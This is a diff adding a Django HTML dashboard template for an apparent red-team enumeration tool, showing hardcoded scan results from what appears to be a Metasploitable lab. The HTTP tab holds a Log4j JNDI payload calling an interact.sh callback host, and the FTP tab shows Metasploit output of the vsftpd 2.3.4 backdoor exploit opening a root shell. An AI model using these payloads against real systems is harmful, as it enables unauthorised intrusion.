@@ -1,0 +1,755 @@
+<html>
+{% load static %}
+
+<head>
+    <!-- Required meta tags -->
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <!-- Bootstrap CSS -->
+    <link rel="stylesheet" href="{% static 'assets/vendor/bootstrap/css/bootstrap.min.css' %}">
+    <link href="{% static 'assets/vendor/fonts/circular-std/style.css' %}" rel="stylesheet">
+    <link rel="stylesheet" href="{% static 'assets/libs/css/style.css' %}">
+    <link rel="stylesheet" href="{% static 'assets/vendor/fonts/fontawesome/css/fontawesome-all.css' %}">
+    <link rel="stylesheet" href="{% static 'assets/vendor/charts/chartist-bundle/chartist.css' %}">
+    <link rel="stylesheet" href="{% static 'assets/vendor/charts/morris-bundle/morris.css' %}">
+    <link rel="stylesheet" href="{%
+             static 'assets/vendor/fonts/material-design-iconic-font/css/materialdesignicons.min.css' %}">
+    <link rel="stylesheet" href="{% static 'assets/vendor/charts/c3charts/c3.css' %}">
+    <link rel="stylesheet" href="{% static 'assets/vendor/fonts/flag-icon-css/flag-icon.min.css' %}">
+    <script src="jquery.js"></script>
+    
+
+    <style>
+        .nmap-formatter {
+            width: 1000px;
+            margin: 300px auto;
+           
+          
+        }
+        .logo-image {
+            max-width: 100%;
+            height: 100%;
+            border-radius: 50%;
+
+            border-style: none;
+            text-align: left;
+        }
+
+        /* ===================== FILE INPUT ===================== */
+        .file-area {
+            width: 100%;
+            position: relative;
+        }
+
+        .file-area input[type="file"] {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            opacity: 0;
+            cursor: pointer;
+        }
+
+        .file-area .file-dummy {
+            width: 100%;
+            padding: 30px;
+            background: rgba(0, 0, 0, 0.05);
+            border: 2px dashed rgba(0, 0, 0, 0.05);
+            text-align: center;
+            transition: background 0.3s ease-in-out;
+        }
+
+        .file-area .file-dummy .success {
+            display: none;
+        }
+
+        .file-area:hover .file-dummy {
+            background: rgba(0, 0, 0, 0.8);
+        }
+
+        .file-area input[type="file"]:focus+.file-dummy {
+            outline: 2px solid rgba(255, 255, 255, 0.5);
+            outline: -webkit-focus-ring-color auto 5px;
+        }
+
+        .file-area input[type="file"]:valid+.file-dummy {
+            border-color: rgba(0, 255, 0, 0.4);
+            background-color: rgba(0, 255, 0, 0.3);
+        }
+
+        .file-area input[type="file"]:valid+.file-dummy .success {
+            display: inline-block;
+        }
+
+        .file-area input[type="file"]:valid+.file-dummy .default {
+            display: none;
+        }
+
+        /* ===================== BASIC STYLING ===================== */
+        * {
+            box-sizing: border-box;
+            font-family: "Lato", sans-serif;
+        }
+
+        html,
+        body {
+            margin: 0;
+            padding: 0;
+            font-weight: 200;
+            height: 100%;
+            background: #efeff6;
+            color: #fff;
+            font-size: 16px;
+            
+            background: -moz-linear-gradient(top, #efeff6 0%, #efeff6 100%);
+            /* FF3.6+ */
+            background: -webkit-gradient(linear, left top, left bottom, color-stop(0%, #efeff6), color-stop(100%, #efeff6));
+            /* Chrome,Safari4+ */
+            background: -webkit-linear-gradient(top, #efeff6 0%, #efeff6 100%);
+            /* Chrome10+,Safari5.1+ */
+            background: -o-linear-gradient(top, #efeff6 0%, #efeff6 100%);
+            /* Opera 11.10+ */
+            background: -ms-linear-gradient(top, #efeff6 0%, #efeff6 100%);
+            /* IE10+ */
+            background: linear-gradient(to bottom, #efeff6 0%, #efeff6 100%);
+            /* W3C */
+        }
+
+        h1 {
+            text-align: center;
+            margin: 50px auto;
+            font-weight: 100;
+            color: #000;
+        }
+
+        label {
+            font-weight: 500;
+            display: block;
+            margin: 4px 0;
+            text-transform: uppercase;
+            font-size: 13px;
+            overflow: hidden;
+            color: #000;
+        }
+
+        label span {
+            float: right;
+            text-transform: none;
+            font-weight: 200;
+            line-height: 1em;
+            font-style: italic;
+            opacity: 0.8;
+        }
+
+        .form-controll {
+            display: block;
+            padding: 8px 16px;
+            width: 100%;
+            font-size: 16px;
+            background-color: rgba(0, 0, 0, 0.05);
+            border: 1px solid rgba(0, 0, 0, 0.05);
+            color: #000;
+            font-weight: 200;
+        }
+
+        .form-controll:focus {
+            outline: 2px solid rgba(255, 255, 255, 0.5);
+            outline: -webkit-focus-ring-color auto 5px;
+        }
+
+        button {
+            padding: 8px 30px;
+            background: rgba(255, 255, 255, 0.8);
+            color: #053777;
+            text-transform: uppercase;
+            font-weight: 600;
+            font-size: 11px;
+            border: 0;
+            text-shadow: 0 1px 2px #fff;
+            cursor: pointer;
+        }
+
+        .form-group {
+            max-width: 500px;
+            margin: auto;
+            margin-bottom: 30px;
+        }
+
+        .back-to-article {
+            color: #fff;
+            text-transform: uppercase;
+            font-size: 12px;
+            position: absolute;
+            right: 20px;
+            top: 20px;
+            text-decoration: none;
+            display: inline-block;
+            background: rgba(0, 0, 0, 0.6);
+            padding: 10px 18px;
+            transition: all 0.3s ease-in-out;
+            opacity: 0.6;
+        }
+
+        .back-to-article:hover {
+            opacity: 1;
+            background: rgba(0, 0, 0, 0.8);
+        }
+    </style>
+</head>
+
+
+<!-- navbar -->
+<!-- ============================================================== -->
+<div class="dashboard-header">
+    <nav class="navbar navbar-expand-lg bg-white fixed-top">
+        <a class="navbar-brand" href="/">
+            <div class="logo-image">
+                <img src="https://assets.ey.com/content/dam/ey-sites/ey-com/en_gl/generic/logos/20170526-EY-Digital-Brand.svg"
+                    class="img-fluid">
+            </div>
+        </a>
+        <a class="navbar-brand" href="index.html">RedTeam's Enumeration Platfom</a>
+        <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+            <span class="navbar-toggler-icon"></span>
+        </button>
+        <div class="collapse navbar-collapse " id="navbarSupportedContent">
+            <ul class="navbar-nav ml-auto navbar-right-top">
+                <li class="nav-item">
+                    <div id="custom-search" class="top-search-bar">
+                        <input class="form-control" type="text" placeholder="Search..">
+                    </div>
+                </li>
+                <li class="nav-item dropdown notification">
+                    <a class="nav-link nav-icons" href="#" id="navbarDropdownMenuLink1" data-toggle="dropdown"
+                        aria-haspopup="true" aria-expanded="false"><i class="fas fa-fw fa-bell"></i> <span
+                            class="indicator"></span></a>
+                    <ul class="dropdown-menu dropdown-menu-right notification-dropdown">
+                        <li>
+                            <div class="notification-title"> Notification</div>
+                            <div class="notification-list">
+                                <div class="list-group">
+                                    <a href="#" class="list-group-item list-group-item-action active">
+                                        <div class="notification-info">
+                                            <div class="notification-list-user-img"><img
+                                                    src="{% static 'assets/images/avatar-2.jpg' %}" alt=""
+                                                    class="user-avatar-md rounded-circle"></div>
+                                            <div class="notification-list-user-block"><span
+                                                    class="notification-list-user-name">Jeremy
+                                                    Rakestraw</span>accepted your invitation to join the team.
+                                                <div class="notification-date">2 min ago</div>
+                                            </div>
+                                        </div>
+                                    </a>
+                                    <a href="#" class="list-group-item list-group-item-action">
+                                        <div class="notification-info">
+                                            <div class="notification-list-user-img"><img
+                                                    src="{% static 'assets/images/avatar-3.jpg' %}" alt=""
+                                                    class="user-avatar-md rounded-circle"></div>
+                                            <div class="notification-list-user-block"><span
+                                                    class="notification-list-user-name">John Abraham </span>is
+                                                now following you
+                                                <div class="notification-date">2 days ago</div>
+                                            </div>
+                                        </div>
+                                    </a>
+                                    <a href="#" class="list-group-item list-group-item-action">
+                                        <div class="notification-info">
+                                            <div class="notification-list-user-img"><img
+                                                    src="{% static 'assets/images/avatar-4.jpg' %}" alt=""
+                                                    class="user-avatar-md rounded-circle"></div>
+                                            <div class="notification-list-user-block"><span
+                                                    class="notification-list-user-name">Monaan Pechi</span> is
+                                                watching your main repository
+                                                <div class="notification-date">2 min ago</div>
+                                            </div>
+                                        </div>
+                                    </a>
+                                    <a href="#" class="list-group-item list-group-item-action">
+                                        <div class="notification-info">
+                                            <div class="notification-list-user-img"><img
+                                                    src="{% static 'assets/images/avatar-5.jpg' %}" alt=""
+                                                    class="user-avatar-md rounded-circle"></div>
+                                            <div class="notification-list-user-block"><span
+                                                    class="notification-list-user-name">Jessica
+                                                    Caruso</span>accepted your invitation to join the team.
+                                                <div class="notification-date">2 min ago</div>
+                                            </div>
+                                        </div>
+                                    </a>
+                                </div>
+                            </div>
+                        </li>
+                        <li>
+                            <div class="list-footer"> <a href="#">View all notifications</a></div>
+                        </li>
+                    </ul>
+                </li>
+                <li class="nav-item dropdown connection">
+                    <a class="nav-link" href="#" id="navbarDropdown" role="button" data-toggle="dropdown"
+                        aria-haspopup="true" aria-expanded="false"> <i class="fas fa-fw fa-th"></i> </a>
+                    <ul class="dropdown-menu dropdown-menu-right connection-dropdown">
+                        <li class="connection-list">
+                            <div class="row">
+                                <div class="col-xl-4 col-lg-4 col-md-6 col-sm-12 col-12 ">
+                                    <a href="#" class="connection-item"><img
+                                            src="{% static 'assets/images/github.png' %}" alt="">
+                                        <span>Github</span></a>
+                                </div>
+                                <div class="col-xl-4 col-lg-4 col-md-6 col-sm-12 col-12 ">
+                                    <a href="#" class="connection-item"><img
+                                            src="{% static 'assets/images/dribbble.png' %}" alt="">
+                                        <span>Dribbble</span></a>
+                                </div>
+                                <div class="col-xl-4 col-lg-4 col-md-6 col-sm-12 col-12 ">
+                                    <a href="#" class="connection-item"><img
+                                            src="{% static 'assets/images/dropbox.png' %}" alt="">
+                                        <span>Dropbox</span></a>
+                                </div>
+                            </div>
+                            <div class="row">
+                                <div class="col-xl-4 col-lg-4 col-md-6 col-sm-12 col-12 ">
+                                    <a href="#" class="connection-item"><img
+                                            src="{% static 'assets/images/bitbucket.png' %}" alt="">
+                                        <span>Bitbucket</span></a>
+                                </div>
+                                <div class="col-xl-4 col-lg-4 col-md-6 col-sm-12 col-12 ">
+                                    <a href="#" class="connection-item"><img
+                                            src="{% static 'assets/images/mail_chimp.png' %}" alt=""><span>Mail
+                                            chimp</span></a>
+                                </div>
+                                <div class="col-xl-4 col-lg-4 col-md-6 col-sm-12 col-12 ">
+                                    <a href="#" class="connection-item"><img
+                                            src="{% static 'assets/images/slack.png' %}" alt="">
+                                        <span>Slack</span></a>
+                                </div>
+                            </div>
+                        </li>
+                        <li>
+                            <div class="conntection-footer"><a href="#">More</a></div>
+                        </li>
+                    </ul>
+                </li>
+                <li class="nav-item dropdown nav-user">
+                    <a class="nav-link nav-user-img" href="#" id="navbarDropdownMenuLink2" data-toggle="dropdown"
+                        aria-haspopup="true" aria-expanded="false"><img src="assets/images/avatar-1.jpg' %}" alt=""
+                            class="user-avatar-md rounded-circle"></a>
+                    <div class="dropdown-menu dropdown-menu-right nav-user-dropdown"
+                        aria-labelledby="navbarDropdownMenuLink2">
+                        <div class="nav-user-info">
+                            <h5 class="mb-0 text-white nav-user-name">John Abraham </h5>
+                            <span class="status"></span><span class="ml-2">Available</span>
+                        </div>
+                        <a class="dropdown-item" href="#"><i class="fas fa-user mr-2"></i>Account</a>
+                        <a class="dropdown-item" href="#"><i class="fas fa-cog mr-2"></i>Setting</a>
+                        <a class="dropdown-item" href="{%url 'signout' %}"><i
+                                class="fas fa-power-off mr-2"></i>Logout</a>
+                    </div>
+                </li>
+            </ul>
+        </div>
+    </nav>
+</div>
+<!-- ============================================================== -->
+<!-- end navbar -->
+<!-- ============================================================== -->
+<!-- left sidebar -->
+<!-- ============================================================== -->
+<div class="nav-left-sidebar sidebar-dark">
+    <div class="menu-list">
+        <nav class="navbar navbar-expand-lg navbar-light">
+            <a class="d-xl-none d-lg-none" href="#">Dashboard</a>
+            <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNav"
+                aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
+                <span class="navbar-toggler-icon"></span>
+            </button>
+            <div class="collapse navbar-collapse" id="navbarNav">
+                <ul class="navbar-nav flex-column">
+                    <li class="nav-divider">
+                        Menu
+                    </li>
+                    <li class="nav-item ">
+                        <a class="nav-link active" href="#" data-toggle="collapse" aria-expanded="false"
+                            data-target="#submenu-1" aria-controls="submenu-1"><i
+                                class="fa fa-fw fa-user-circle"></i>Dashboard <span
+                                class="badge badge-success">6</span></a>
+                        <div id="submenu-1" class="collapse submenu" style="">
+                            <ul class="nav flex-column">
+                                <li class="nav-item">
+                                    <a class="nav-link" href="#" data-toggle="collapse" aria-expanded="false"
+                                        data-target="#submenu-1-2" aria-controls="submenu-1-2">Manage Scans</a>
+                                    <div id="submenu-1-2" class="collapse submenu" style="">
+                                        <ul class="nav flex-column">
+                                            <li class="nav-item">
+                                                <a class="nav-link" href="">create</a>
+                                            </li>
+                                            <li class="nav-item">
+                                                <a class="nav-link" href="ecommerce-product.html">modify </a>
+                                            </li>
+                                            <li class="nav-item">
+                                                <a class="nav-link" href="ecommerce-product-single.html"> update</a>
+                                            </li>
+                                            <li class="nav-item">
+                                                <a class="nav-link" href="ecommerce-product-checkout.html">add</a>
+                                            </li>
+                                        </ul>
+                                    </div>
+                                </li>
+                                <li class="nav-item">
+                                    <a class="nav-link" href="dashboard-finance.html"></a>
+                                </li>
+                                <li class="nav-item">
+                                    <a class="nav-link" href="dashboard-sales.html"></a>
+                                </li>
+                                <li class="nav-item">
+                                    <a class="nav-link" href="#" data-toggle="collapse" aria-expanded="false"
+                                        data-target="#submenu-1-1" aria-controls="submenu-1-1">manage Asset
+                                        Discovery</a>
+                                    <div id="submenu-1-1" class="collapse submenu" style="">
+                                        <ul class="nav flex-column">
+                                            <li class="nav-item">
+                                                <a class="nav-link" href="dashboard-influencer.html">View assets</a>
+                                            </li>
+                                            <li class="nav-item">
+                                                <a class="nav-link" href="'authentication/asset_discovery.html'">Update
+                                                    assets
+                                                    information</a>
+                                            </li>
+                                            <li class="nav-item">
+                                                <a class="nav-link" href="influencer-profile.html">Delete assets</a>
+                                            </li>
+                                        </ul>
+                                    </div>
+                                </li>
+                            </ul>
+                        </div>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link" href="#" data-toggle="collapse" aria-expanded="false"
+                            data-target="#submenu-2" aria-controls="submenu-2"><i
+                                class="fa fa-fw fa-rocket"></i>Consult</a>
+                        <div id="submenu-2" class="collapse submenu" style="">
+                            <ul class="nav flex-column">
+                                <li class="nav-item">
+                                    <a class="nav-link" href="pages/cards.html">Consult Scans <span
+                                            class="badge badge-secondary">New</span></a>
+                                </li>
+                                <li class="nav-item">
+                                    <a class="nav-link" href="pages/general.html">Consult Asset Discovery</a>
+                                </li>
+
+
+                            </ul>
+                        </div>
+                    </li>
+
+                </ul>
+            </div>
+        </nav>
+    </div>
+</div>
+<!-- ============================================================== -->
+<!-- end left sidebar -->
+<!-- ============================================================== -->
+
+<head>
+    <meta name="description" content="CSS Tabs" />
+    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/normalize/2.0.1/normalize.css">
+    <link href='https://fonts.googleapis.com/css?family=PT+Sans' rel='stylesheet' type='text/css'>
+    <title>CSS Tabs</title>
+    <meta charset=utf-8>
+    <link rel="import" href="authentication/web_formatter.html">
+
+    <script>
+        $(function(){
+            $("#includedContent").load("authentication/web_formatter.html"); 
+          });
+          </script> 
+</head>
+<style>
+    * {
+        box-sizing: border-box;
+    }
+
+    body {
+        background: url(https://subtlepatterns.com/patterns/use_your_illusion.png);
+        color: #eee;
+        font: 1em 'PT Sans', sans-serif;
+    }
+
+    ::selection {
+        background-color: #4EC6DE;
+    }
+
+    .tabbed {
+        width: 1000px;
+        margin: 200px auto;
+        height: 200px;
+
+        
+    }
+
+    .tabbed>input {
+        display: none;
+    }
+
+    .tabbed>label {
+        display: block;
+        float: left;
+        padding: 20px 20px;
+        margin-right: 5px;
+        cursor: pointer;
+        transition: background-color .3s;
+    }
+
+    .tabbed>label:hover,
+    .tabbed>input:checked+label {
+        background: #4EC6DE;
+    }
+
+    .tabs {
+        margin: 0;
+        padding : 0;
+        clear: both;
+        perspective: 1500px;
+    }
+
+    .tabs>div {
+        width: 1000px;
+        position: absolute;
+        border: 2px solid #4EC6DE;
+        padding: 10px 30px 40px;
+        line-height: 1.4em;
+        opacity: 0;
+        transform: rotateX(-20deg);
+        transform-origin: top center;
+        transition: opacity .3s, transform 1s;
+        z-index: 0;
+    }
+
+    #tab-nav-1:checked~.tabs>div:nth-of-type(1),
+    #tab-nav-2:checked~.tabs>div:nth-of-type(2),
+    #tab-nav-3:checked~.tabs>div:nth-of-type(3),
+    #tab-nav-4:checked~.tabs>div:nth-of-type(4) 
+    #tab-nav-4:checked~.tabs>div:nth-of-type(5) 
+    #tab-nav-4:checked~.tabs>div:nth-of-type(6) 
+    #tab-nav-4:checked~.tabs>div:nth-of-type(7) 
+    #tab-nav-4:checked~.tabs>div:nth-of-type(8) 
+    #tab-nav-4:checked~.tabs>div:nth-of-type(9) 
+    #tab-nav-4:checked~.tabs>div:nth-of-type(10) {
+        transform: rotateX(0);
+        opacity: 1;
+        z-index: 1;
+    }
+
+    @media screen and (max-width: 1500px) {
+        .tabbed {
+            width: 1600px
+        }
+
+        .tabbed>label {
+            display: none
+        }
+
+        .tabs>div {
+            width: 400px;
+            border: none;
+            padding: 0;
+            opacity: 1;
+            position: relative;
+            transform: none;
+            margin-bottom: 100px;
+        }
+
+        .tabs>div h2 {
+            border-bottom: 2px solid #070707;
+            padding-bottom: .5em;
+        }
+    }
+</style>
+
+
+<body>
+    
+    <div class="tabbed">
+        <input type="radio" name="tabs" id="tab-nav-1" checked>
+        <label for="tab-nav-1">HTTP</label>
+        <input type="radio" name="tabs" id="tab-nav-2">
+        <label for="tab-nav-2">FTP</label>
+        <input type="radio" name="tabs" id="tab-nav-3">
+        <label for="tab-nav-3">SMB</label>
+        <input type="radio" name="tabs" id="tab-nav-4">
+        <label for="tab-nav-4">Netbios</label>
+        <input type="radio" name="tabs" id="tab-nav-5" checked>
+        <label for="tab-nav-5">Kerberos</label>
+        <input type="radio" name="tabs" id="tab-nav-6" checked>
+        <label for="tab-nav-6">rpc</label>
+        <input type="radio" name="tabs" id="tab-nav-7" checked>
+        <label for="tab-nav-7">nfs</label>
+        <input type="radio" name="tabs" id="tab-nav-8" checked>
+        <label for="tab-nav-8">SMTP</label>
+        <input type="radio" name="tabs" id="tab-nav-9" checked>
+        <label for="tab-nav-9">DNS</label>
+        <input type="radio" name="tabs" id="tab-nav-10" checked>
+        <label for="tab-nav-10">MySQL</label>
+        <div class="tabs" >
+            <div>
+                
+                <h2>HTTP</h2>
+                <pre style="color: black;"> 
+                 +Apache/2.2.8 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+                + /phpinfo.php: Output from the phpinfo() function was found.
+                + OSVDB-3268: /test/: Directory indexing found.
+                    
+                Scan Aborted: The remote website is up, but does not seem to be running WordPress.
+                    
+                Checking for Log4j RCE CVE-2021-44228.
+                URL: http://172.23.101.159
+                Targets do not seem to be vulnerable.
+                OSVDB-3233: /phpinfo.php: PHP is installed, and a test script which runs phpinfo() was found. This gives a lot of system information.
+                OSVDB-3268: /icons/: Directory indexing found.\r\n+ OSVDB-3233: /icons/README: Apache default file found.
+                PAYLOAD: ${jndi:ldap://172.23.101.159.650rr10199fj4w0g8km77w94o8911498u.interact.sh/64l2j30}
+                Server may leak inodes via ETags, header found with file /phpMyAdmin/ChangeLog, inode: 92462, size: 40540  
+                </pre>
+            </div>
+            <div>
+                <h2>FTP</h2>
+                <pre style="color: black" >
+                    RUNNING VSFTPD 2.3.4 BACKDOOR EXPLOIT
+                    RHOST => 172.18.202.164
+                    RHOSTS => 172.18.202.164
+                    LHOST => 127.0.0.1
+                    LPORT => 4444
+                    [*] No payload configured, defaulting to cmd/unix/interact
+                    [*] 172.18.202.164:21 - Banner: 220 (vsFTPd 2.3.4)
+                    [*] 172.18.202.164:21 - USER: 331 Please specify the password.
+                    [+] 172.18.202.164:21 - Backdoor service has been spawned, handling...
+                    [+] 172.18.202.164:21 - UID: uid=0(root) gid=0(root)
+                    [*] Found shell.
+                    [*] Command shell session 1 opened (172.18.200.156:40041 -> 172.18.202.164:6200) </pre>
+                    
+            </div>
+        
+            <div>
+                <h2>SMB</h2>
+                <pre style="color: black;">
+                    Anonymous login successful
+                    Sharename       Type      Comment
+                    ---------       ----      -------
+                    print$          Disk      Printer Drivers
+                    tmp             Disk      oh noes!
+                    opt             Disk
+                    IPC$            IPC       IPC Service (metasploitable server (Samba 3.0.20-Debian))
+                    ADMIN$          IPC       IPC Service (metasploitable server (Samba 3.0.20-Debian))
+            Reconnecting with SMB1 for workgroup listing.
+            Anonymous login successful
+            
+                    Server               Comment
+                    ---------            -------
+            
+                    Workgroup            Master
+                    ---------            -------
+                    WORKGROUP            METASPLOITABLE
+
+            </div>
+            <div>
+                <h2>Output</h2>
+                <p style="color: black;">
+            
+                    
+  
+            </div>
+            <div>
+                <h2>Output</h2>
+                <p style="color: black;">
+            
+                    
+  
+            </div>
+            <div>
+                <h2>Output</h2>
+                <p style="color: black;">
+            
+                    
+  
+            </div>
+            <div>
+                <h2>Output</h2>
+                <p style="color: black;">
+            
+                    
+  
+            </div>
+            <div>
+                <h2>Output</h2>
+                <p style="color: black;">
+            
+                    
+  
+            </div>
+           
+           
+           
+            <div>
+                <h2>DNS</h2>
+                <pre style="color: black;">
+                   
+    
+                </pre>
+            
+                    
+  
+            </div>
+            <div>
+                <h2>Output</h2>
+                <p style="color: black;">
+            
+                    
+  
+            </div>
+    
+    
+        
+
+
+
+<script>'undefined' === typeof _trfq || (window._trfq = []); 'undefined' === typeof _trfd && (window._trfd = []), _trfd.push({ 'tccl.baseHost': 'secureserver.net' }), _trfd.push({ 'ap': 'cpbh-mt' }, { 'server': 'p3plmcpnl487010' }, { 'id': '8437534' }) 
+</script>
+<script src='https://img1.wsimg.com/tcc/tcc_l.combined.1.0.6.min.js'></script>
+<script src="js/jquery.min.js"></script>
+<script src="js/popper.js"></script>
+<script src="js/bootstrap.min.js"></script>
+<script src="js/main.js"></script>
+<script src="//code.jquery.com/jquery-1.10.2.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prefixfree/1.0.6/prefixfree.min.js"></script>
+<script type="text/javascript">
+   
+    $(function (){
+        $(".SecondDivID").load("http://127.0.0.1:8000/web_formatter/");
+    });</script>
+
+<script src="{% static 'assets/vendor/jquery/jquery-3.3.1.min.js' %}"></script>
+<!-- bootstap bundle js -->
+<script src="{% static 'assets/vendor/bootstrap/js/bootstrap.bundle.js' %}"></script>
+<!-- slimscroll js -->
+<script src="{% static 'assets/vendor/slimscroll/jquery.slimscroll.js' %}"></script>
+<!-- main js -->
+<script src="{% static 'assets/libs/js/main-js.js' %}"></script>
+<!-- chart chartist js -->
+<script src="{% static 'assets/vendor/charts/chartist-bundle/chartist.min.js' %}"></script>
+<!-- sparkline js -->
+<script src="{% static 'assets/vendor/charts/sparkline/jquery.sparkline.js' %}"></script>
+<!-- morris js -->
+<script src="{% static 'assets/vendor/charts/morris-bundle/raphael.min.js' %}"></script>
+<script src="{% static 'assets/vendor/charts/morris-bundle/morris.js' %}"></script>
+<!-- chart c3 js -->
+<script src="{% static 'assets/vendor/charts/c3charts/c3.min.js' %}"></script>
+<script src="{% static 'assets/vendor/charts/c3charts/d3-5.4.0.min.js' %}"></script>
+<script src="{% static 'assets/vendor/charts/c3charts/C3chartjs.js' %}"></script>
+<script src="{% static 'assets/libs/js/dashboard-ecommerce.js' %}"></script>
+
+
+</html>
